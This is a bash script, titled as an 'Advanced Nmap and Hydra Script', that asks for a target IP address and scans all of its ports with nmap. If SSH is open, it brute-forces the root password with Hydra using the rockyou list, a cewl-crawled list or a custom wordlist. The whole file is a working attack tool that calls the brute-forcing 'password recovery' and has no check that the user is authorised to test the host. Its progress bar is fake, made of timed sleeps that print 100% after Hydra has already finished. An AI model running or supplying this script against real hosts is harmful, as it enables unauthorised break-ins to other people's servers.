#!/bin/bash

# Define constants
WORDLIST_DIR="/path/to/wordlists"
HYDRA_THREADS=8
HYDRA_TIMEOUT=10

# Display a banner
echo "███████╗███╗   ███╗██╗███╗   ██╗███████╗██╗   ██╗██╗  ██╗"
echo "██╔════╝████╗ ████║██║████╗  ██║██╔════╝██║   ██║╚██╗██╔╝"
echo "█████╗  ██╔████╔██║██║██╔██╗ ██║█████╗  ██║   ██║ ╚███╔╝ "
echo "██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║   ██║ ██╔██╗ "
echo "███████╗██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╔╝██╔╝ ██╗"
echo "╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
echo "Advanced Nmap and Hydra Script"
echo

# Display a prompt for the user to enter a target IP address
read -r -p "Enter a target IP address: " ip_address

# Check if the target IP address is valid
if ! [[ "$ip_address" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Invalid IP address"
  exit 1
fi

# Run Nmap to scan for open ports and store the output in a variable
echo "Scanning for open ports on $ip_address..."
nmap_output=$(nmap -p- -T4 "$ip_address")

# Display the open ports in a user-friendly format
echo "Open ports for $ip_address:"
echo "$nmap_output" | grep 'open'

# Check if an SSH server is open and prompt the user to run Hydra for password recovery
if echo "$nmap_output" | grep -q '22/tcp open ssh'; then
  read -r -p "An SSH server is open on $ip_address. Do you want to run Hydra for password recovery? (y/n) " run_hydra
  if [[ "$run_hydra" =~ ^[Yy]$ ]]; then
    echo "Type 'rockyou.txt' for rockyou wordlist. Type :'cewl.txt' for automatic wordlist creation. Type 'custom_wordlist.txt' to path your own wordlist."
    select wordlist_name in "rockyou.txt" "cewl.txt" "custom_wordlist.txt"; do
      case $wordlist_name in
        "rockyou.txt")
          wordlist_path="$WORDLIST_DIR/rockyou.txt"
          break
          ;;
        "cewl.txt")
          if command -v cewl >/dev/null 2>&1; then
            read -r -p "Enter a URL to crawl: " cewl_url
            cewl_output="$WORDLIST_DIR/cewl_output.txt"
            cewl "$cewl_url" -w $cewl_output
            wordlist_path="$cewl_output"
            break
          else
            echo "Error: cewl command not found. Please install cewl and try again."
            exit 1
          fi
          ;;
        "custom_wordlist.txt")
          read -r -p "Enter the path to a custom wordlist: " custom_wordlist_path
          if [[ -f "$custom_wordlist_path" ]]; then
            wordlist_path="$custom_wordlist_path"
            break
          else
            echo "Error: $custom_wordlist_path not found. Please check the file path and try again."
          fi
          ;;
        *)
          echo "Invalid option. Please select a valid wordlist."
          ;;
      esac
    done

    # Run Hydra to recover the SSH password using the selected wordlist
    hydra_output=$(hydra -l root -P "$wordlist_path" -t $HYDRA_THREADS -s 22 -o hydra_output.txt "$ip_address" ssh -T $HYDRA_TIMEOUT)

    # Display a progress indicator for Hydra
    echo "Running Hydra password recovery:"
    echo -ne '#####                     (25%)\r'
    sleep 2
    echo -ne '#############             (50%)\r'
    sleep 2
    echo -ne '#######################   (100%)\r'
    echo -ne '\n'

    # Output the Hydra results to the user
    echo "$hydra_output"
    echo "Hydra password recovery complete. Results saved to hydra_output.txt."
  fi
fi


